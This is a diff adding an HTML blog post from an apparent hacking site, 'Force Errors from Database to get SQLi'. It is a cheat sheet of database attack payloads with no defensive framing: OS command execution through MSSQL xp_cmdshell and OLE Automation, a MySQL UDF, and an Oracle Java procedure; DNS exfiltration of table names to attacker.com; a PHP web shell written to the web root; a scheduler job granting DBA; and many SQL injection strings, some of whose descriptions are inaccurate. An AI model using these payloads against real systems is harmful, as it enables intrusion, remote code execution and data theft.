@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Force Errors from Database to get SQLi | ByteShifters</title>
+<meta property="og:title" content="Force Errors from Database to get SQLi | ByteShifters" />
+<meta name="twitter:title" content="Force Errors from Database to get SQLi | ByteShifters" />
+<meta itemprop="name" content="Force Errors from Database to get SQLi | ByteShifters" />
+<meta name="application-name" content="Force Errors from Database to get SQLi | ByteShifters" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-10-03T00:00:00Z />
+    <meta property="article:published_time" content=2024-10-03T00:00:00Z />
+    <meta property="og:url" content="https://byteshifters.com/posts/hacking/sql-injections/force-errors-from-database-for-sqli/" />
+
+    
+    <meta property="og:article:author" content="ByteShifters" />
+    <meta property="article:author" content="ByteShifters" />
+    <meta name="author" content="ByteShifters" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Force Errors from Database to get SQLi",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-10-03",
+        "description": "",
+        "wordCount":  737 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-10-03",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "ByteShifters"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.122.0">
+
+    
+    <meta property="og:title" content="Force Errors from Database to get SQLi" />
+<meta property="og:description" content="MSSQL OLE Automation Procedures DECLARE @Object INT; EXEC sp_OACreate &#39;WScript.Shell&#39;, @Object OUTPUT; EXEC sp_OAMethod @Object, &#39;Run&#39;, NULL, &#39;cmd.exe /c whoami &gt; C:\output.txt&#39;; This uses OLE Automation procedures to execute system commands.
+XP_CMD Shell with Privilege Escalation EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; EXEC xp_cmdshell &#39;whoami&#39;; This enables xp_cmdshell to execute system commands if it&rsquo;s not already enabled.
+Linked Servers EXEC sp_addlinkedserver &#39;attacker_server&#39;; EXEC sp_addlinkedsrvlogin &#39;attacker_server&#39;, &#39;false&#39;, NULL, &#39;username&#39;, &#39;password&#39;; EXEC (&#39;xp_cmdshell &#39;&#39;net user&#39;&#39;&#39;) AT attacker_server; This technique uses linked servers to run commands on a different server." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://byteshifters.com/posts/hacking/sql-injections/force-errors-from-database-for-sqli/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-10-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-10-03T00:00:00+00:00" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Force Errors from Database to get SQLi"/>
+<meta name="twitter:description" content="MSSQL OLE Automation Procedures DECLARE @Object INT; EXEC sp_OACreate &#39;WScript.Shell&#39;, @Object OUTPUT; EXEC sp_OAMethod @Object, &#39;Run&#39;, NULL, &#39;cmd.exe /c whoami &gt; C:\output.txt&#39;; This uses OLE Automation procedures to execute system commands.
+XP_CMD Shell with Privilege Escalation EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; EXEC xp_cmdshell &#39;whoami&#39;; This enables xp_cmdshell to execute system commands if it&rsquo;s not already enabled.
+Linked Servers EXEC sp_addlinkedserver &#39;attacker_server&#39;; EXEC sp_addlinkedsrvlogin &#39;attacker_server&#39;, &#39;false&#39;, NULL, &#39;username&#39;, &#39;password&#39;; EXEC (&#39;xp_cmdshell &#39;&#39;net user&#39;&#39;&#39;) AT attacker_server; This technique uses linked servers to run commands on a different server."/>
+
+
+    
+    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
+
+    <link rel="canonical" href="https://byteshifters.com/posts/hacking/sql-injections/force-errors-from-database-for-sqli/">
+    <link href="/style.min.a65edcf99b5d9c11dd8dc9c13f2e80eec76933d8449c8579cefe3c64191b71d4.css" rel="stylesheet">
+    <link href="/code-highlight.min.3dea1c7a362e3a7df3392c75d19c1efa95b2e82aa030c322a07a6caf50cb8e9a.css" rel="stylesheet">
+
+    
+    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/logo32.png">
+    
+
+
+
+
+<link rel="manifest" href="https://byteshifters.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#cccccc">
+
+    
+    <link rel="icon" type="image/png"  sizes="32x32" href="/icons/logo32.png">
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://byteshifters.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/contact/">
+                        Contact
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Force Errors from Database to get SQLi</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-10-03T00:00:00&#43;00:00" itemprop="datePublished"> Oct 3, 2024 </time>
+                </div>
+                
+                
+                <div class="tags-list"><a href="https://byteshifters.com/tags/hacking/">#Hacking</a>
+                            <a href="https://byteshifters.com/tags/sqli/">#SQLi</a>
+                            </div>
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b></b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#mssql">MSSQL</a>
+      <ul>
+        <li><a href="#ole-automation-procedures">OLE Automation Procedures</a></li>
+        <li><a href="#xp_cmd-shell-with-privilege-escalation">XP_CMD Shell with Privilege Escalation</a></li>
+        <li><a href="#linked-servers">Linked Servers</a></li>
+      </ul>
+    </li>
+    <li><a href="#mysql">MySQL</a>
+      <ul>
+        <li><a href="#udf-user-defined-functions-for-remote-command-execution">UDF (User Defined Functions) for Remote Command Execution</a></li>
+        <li><a href="#dns-exfiltration">DNS Exfiltration</a></li>
+        <li><a href="#binary-log-injections">Binary Log Injections</a></li>
+      </ul>
+    </li>
+    <li><a href="#oracle">Oracle</a>
+      <ul>
+        <li><a href="#java-procedures-for-command-execution">Java Procedures for Command Execution</a></li>
+        <li><a href="#utl_file-package-for-file-access">UTL_FILE Package for File Access</a></li>
+        <li><a href="#dbms_scheduler-for-job-execution">DBMS_SCHEDULER for Job Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#techniques-to-force-errors-from-databases-for-sql-injection">Techniques to Force Errors from Databases for SQL Injection</a>
+      <ul>
+        <li><a href="#1-syntax-errors">1. Syntax Errors</a>
+          <ul>
+            <li><a href="#classic-syntax-error">Classic Syntax Error</a></li>
+            <li><a href="#unclosed-quotes">Unclosed Quotes</a></li>
+          </ul>
+        </li>
+        <li><a href="#2-type-conversion-errors">2. Type Conversion Errors</a>
+          <ul>
+            <li><a href="#invalid-type-casting">Invalid Type Casting</a></li>
+          </ul>
+        </li>
+        <li><a href="#3-function-based-errors">3. Function-Based Errors</a>
+          <ul>
+            <li><a href="#division-by-zero">Division by Zero</a></li>
+            <li><a href="#invalid-function-usage">Invalid Function Usage</a></li>
+          </ul>
+        </li>
+        <li><a href="#4-subquery-errors">4. Subquery Errors</a>
+          <ul>
+            <li><a href="#invalid-subquery">Invalid Subquery</a></li>
+          </ul>
+        </li>
+        <li><a href="#5-database-specific-errors">5. Database-Specific Errors</a>
+          <ul>
+            <li><a href="#mysql-errors">MySQL Errors</a></li>
+            <li><a href="#postgresql-errors">PostgreSQL Errors</a></li>
+            <li><a href="#mssql-errors">MSSQL Errors</a></li>
+          </ul>
+        </li>
+        <li><a href="#6-information-schema-queries">6. Information Schema Queries</a>
+          <ul>
+            <li><a href="#invalid-table-name">Invalid Table Name</a></li>
+          </ul>
+        </li>
+        <li><a href="#7-blind-sql-injection-errors">7. Blind SQL Injection Errors</a>
+          <ul>
+            <li><a href="#deliberate-false-condition">Deliberate False Condition</a></li>
+          </ul>
+        </li>
+        <li><a href="#8-advanced-error-techniques">8. Advanced Error Techniques</a>
+          <ul>
+            <li><a href="#recursive-queries">Recursive Queries</a></li>
+            <li><a href="#invalid-hexadecimal-values">Invalid Hexadecimal Values</a></li>
+          </ul>
+        </li>
+        <li><a href="#9-combining-techniques">9. Combining Techniques</a>
+          <ul>
+            <li><a href="#chained-error-forcing">Chained Error Forcing</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="mssql">MSSQL</h2>
+<h3 id="ole-automation-procedures">OLE Automation Procedures</h3>
+<pre tabindex="0"><code>DECLARE @Object INT;  
+EXEC sp_OACreate &#39;WScript.Shell&#39;, @Object OUTPUT;  
+EXEC sp_OAMethod @Object, &#39;Run&#39;, NULL, &#39;cmd.exe /c whoami &gt; C:\output.txt&#39;;  
+</code></pre><p>This uses OLE Automation procedures to execute system commands.</p>
+<h3 id="xp_cmd-shell-with-privilege-escalation">XP_CMD Shell with Privilege Escalation</h3>
+<pre tabindex="0"><code>EXEC sp_configure &#39;show advanced options&#39;, 1;  
+RECONFIGURE;  
+EXEC sp_configure &#39;xp_cmdshell&#39;, 1;  
+RECONFIGURE;  
+EXEC xp_cmdshell &#39;whoami&#39;;  
+</code></pre><p>This enables <strong>xp_cmdshell</strong> to execute system commands if it&rsquo;s not already enabled.</p>
+<h3 id="linked-servers">Linked Servers</h3>
+<pre tabindex="0"><code>EXEC sp_addlinkedserver &#39;attacker_server&#39;;  
+EXEC sp_addlinkedsrvlogin &#39;attacker_server&#39;, &#39;false&#39;, NULL, &#39;username&#39;, &#39;password&#39;;  
+EXEC (&#39;xp_cmdshell &#39;&#39;net user&#39;&#39;&#39;) AT attacker_server;  
+</code></pre><p>This technique uses linked servers to run commands on a different server.</p>
+<h2 id="mysql">MySQL</h2>
+<h3 id="udf-user-defined-functions-for-remote-command-execution">UDF (User Defined Functions) for Remote Command Execution</h3>
+<pre tabindex="0"><code>CREATE TABLE foo(line BLOB);  
+INSERT INTO foo VALUES (LOAD_FILE(&#39;/usr/lib/lib_mysqludf_sys.so&#39;));  
+SELECT * FROM foo INTO DUMPFILE &#39;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#39;;  
+CREATE FUNCTION sys_exec RETURNS INTEGER SONAME &#39;lib_mysqludf_sys.so&#39;;  
+SELECT sys_exec(&#39;id &gt; /tmp/out; chown mysql.mysql /tmp/out&#39;);  
+</code></pre><p>This technique involves creating a UDF to execute system commands.</p>
+<h3 id="dns-exfiltration">DNS Exfiltration</h3>
+<pre tabindex="0"><code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;, (SELECT table_name FROM information_schema.tables LIMIT 0,1), &#39;.attacker.com\\a&#39;));  
+</code></pre><p>This exfiltrates data through DNS requests to an attacker-controlled domain.</p>
+<h3 id="binary-log-injections">Binary Log Injections</h3>
+<pre tabindex="0"><code>SET GLOBAL general_log = &#39;ON&#39;;  
+SET GLOBAL general_log_file = &#39;/var/lib/mysql/mysql.log&#39;;  
+SELECT &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; INTO OUTFILE &#39;/var/www/html/shell.php&#39;;  
+</code></pre><p>This exploits the binary log feature to write a web shell.</p>
+<h2 id="oracle">Oracle</h2>
+<h3 id="java-procedures-for-command-execution">Java Procedures for Command Execution</h3>
+<pre tabindex="0"><code>EXEC dbms_java.grant_permission( &#39;SCOTT&#39;, &#39;SYS:java.io.FilePermission&#39;, &#39;&lt;&lt;ALL FILES&gt;&gt;&#39;, &#39;execute&#39; );  
+EXEC dbms_java.grant_permission( &#39;SCOTT&#39;, &#39;SYS:java.lang.RuntimePermission&#39;, &#39;writeFileDescriptor&#39;, &#39;&#39; );  
+EXEC dbms_java.grant_permission( &#39;SCOTT&#39;, &#39;SYS:java.lang.RuntimePermission&#39;, &#39;readFileDescriptor&#39;, &#39;&#39; );  
+
+CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &#34;cmd&#34; AS  
+import java.io.*;  
+public class cmd {  
+   public static String run(String cmd) {  
+      try {  
+         StringBuffer output = new StringBuffer();  
+         Process p = Runtime.getRuntime().exec(cmd);  
+         BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));  
+         String line = &#34;&#34;;  
+         while ((line = reader.readLine())!= null) {  
+            output.append(line + &#34;\n&#34;);  
+         }  
+         return output.toString();  
+      } catch (Exception e) {  
+         return e.toString();  
+      }  
+   }  
+};  
+/  
+
+CREATE OR REPLACE FUNCTION run_cmd(p_cmd IN VARCHAR2) RETURN VARCHAR2  
+AS LANGUAGE JAVA  
+NAME &#39;cmd.run(java.lang.String) return java.lang.String&#39;;  
+
+SELECT run_cmd(&#39;id&#39;) FROM dual;  
+</code></pre><p>This uses Java stored procedures to execute system commands.</p>
+<h3 id="utl_file-package-for-file-access">UTL_FILE Package for File Access</h3>
+<pre tabindex="0"><code>DECLARE  
+   l_file UTL_FILE.FILE_TYPE;  
+   l_text VARCHAR2(32767);  
+BEGIN  
+   l_file := UTL_FILE.FOPEN(&#39;DIRECTORY_NAME&#39;, &#39;output.txt&#39;, &#39;W&#39;);  
+   UTL_FILE.PUT_LINE(l_file, &#39;Data from UTL_FILE&#39;);  
+   UTL_FILE.FCLOSE(l_file);  
+END;  
+</code></pre><p>This technique uses the UTL_FILE package to write files to the server.</p>
+<h3 id="dbms_scheduler-for-job-execution">DBMS_SCHEDULER for Job Execution</h3>
+<pre tabindex="0"><code>BEGIN  
+   DBMS_SCHEDULER.create_job(  
+      job_name =&gt; &#39;job1&#39;,  
+      job_type =&gt; &#39;PLSQL_BLOCK&#39;,  
+      job_action =&gt; &#39;BEGIN EXECUTE IMMEDIATE &#39;&#39;GRANT DBA TO SCOTT&#39;&#39;; END;&#39;,  
+      start_date =&gt; SYSTIMESTAMP,  
+      repeat_interval =&gt; NULL,  
+      end_date =&gt; NULL,  
+      enabled =&gt; TRUE  
+   );  
+END;  
+</code></pre><p>This uses DBMS_SCHEDULER to execute jobs that can change database permissions.</p>
+<h2 id="techniques-to-force-errors-from-databases-for-sql-injection">Techniques to Force Errors from Databases for SQL Injection</h2>
+<p>Forcing errors in databases can help reveal valuable information about the underlying SQL queries, database structure, and sometimes even the data itself. Here are some advanced techniques to force errors from various databases:</p>
+<h3 id="1-syntax-errors">1. Syntax Errors</h3>
+<h4 id="classic-syntax-error">Classic Syntax Error</h4>
+<pre tabindex="0"><code>&#39; OR 1=1; --  
+</code></pre><p>Introduce a deliberate syntax error to elicit an error message.</p>
+<h4 id="unclosed-quotes">Unclosed Quotes</h4>
+<pre tabindex="0"><code>&#39; OR &#39;a&#39;=&#39;a  
+</code></pre><p>Leave a quote unclosed to generate an error.</p>
+<h3 id="2-type-conversion-errors">2. Type Conversion Errors</h3>
+<h4 id="invalid-type-casting">Invalid Type Casting</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT CAST(&#39;abc&#39; AS SIGNED) --  
+</code></pre><p>Cast a string to an integer to cause a type conversion error.</p>
+<h3 id="3-function-based-errors">3. Function-Based Errors</h3>
+<h4 id="division-by-zero">Division by Zero</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT 1/0 --  
+</code></pre><p>Force a division by zero error.</p>
+<h4 id="invalid-function-usage">Invalid Function Usage</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT EXP(&#39;abc&#39;) --  
+</code></pre><p>Use a function incorrectly to trigger an error.</p>
+<h3 id="4-subquery-errors">4. Subquery Errors</h3>
+<h4 id="invalid-subquery">Invalid Subquery</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS temp) --  
+</code></pre><p>Use a subquery in a way that causes an error.</p>
+<h3 id="5-database-specific-errors">5. Database-Specific Errors</h3>
+<h4 id="mysql-errors">MySQL Errors</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT GTID_SUBSET(&#39;abc&#39;, &#39;def&#39;) --  
+</code></pre><p>Use invalid queries to trigger MySQL-specific errors.</p>
+<h4 id="postgresql-errors">PostgreSQL Errors</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT TO_NUMBER(&#39;abc&#39;, &#39;999&#39;) --  
+</code></pre><p>Use invalid operations to cause PostgreSQL errors.</p>
+<h4 id="mssql-errors">MSSQL Errors</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT CONVERT(INT, &#39;abc&#39;) --  
+</code></pre><p>Use MSSQL-specific functions incorrectly to trigger errors.</p>
+<h3 id="6-information-schema-queries">6. Information Schema Queries</h3>
+<h4 id="invalid-table-name">Invalid Table Name</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT table_name FROM information_schema.tables WHERE table_name = &#39;non_existent_table&#39; --  
+</code></pre><p>Query the information schema with an invalid table name.</p>
+<h3 id="7-blind-sql-injection-errors">7. Blind SQL Injection Errors</h3>
+<h4 id="deliberate-false-condition">Deliberate False Condition</h4>
+<pre tabindex="0"><code>&#39; AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=&#39;non_existent_database&#39;) --  
+</code></pre><p>Use a false condition to force an error indirectly.</p>
+<h3 id="8-advanced-error-techniques">8. Advanced Error Techniques</h3>
+<h4 id="recursive-queries">Recursive Queries</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT 1 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4) AS temp WHERE temp=1 --  
+</code></pre><p>Use recursive queries to force errors.</p>
+<h4 id="invalid-hexadecimal-values">Invalid Hexadecimal Values</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT 0xZZ --  
+</code></pre><p>Use invalid hexadecimal values to trigger errors.</p>
+<h3 id="9-combining-techniques">9. Combining Techniques</h3>
+<h4 id="chained-error-forcing">Chained Error Forcing</h4>
+<pre tabindex="0"><code>&#39; UNION SELECT CONVERT(INT, &#39;abc&#39;) UNION SELECT 1/0 UNION SELECT TO_NUMBER(&#39;abc&#39;, &#39;999&#39;) --  
+</code></pre><p>Combine multiple error-forcing techniques for more robust results.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        
+        byteshifters.com
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://byteshifters.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
